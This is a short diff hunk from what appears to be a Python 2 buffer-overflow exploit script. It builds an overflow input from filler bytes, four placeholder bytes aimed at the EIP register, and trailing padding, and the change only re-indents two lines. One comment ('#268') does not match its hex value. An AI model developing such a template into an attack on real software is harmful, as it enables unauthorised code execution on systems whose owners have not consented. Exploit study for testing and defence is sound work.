@@ -85,8 +85,8 @@ try:
 	print "Checking...."
 
 	filler = 'A' * 0x8f0 #2288  
-  eip = 'B' * 0x4     
-  buffer = 'C' * 0x616 #268  
+ 	eip = 'B' * 0x4     
+  	buffer = 'C' * 0x616 #268  
 
 	inputBuffer = filler + eip + buffer
 
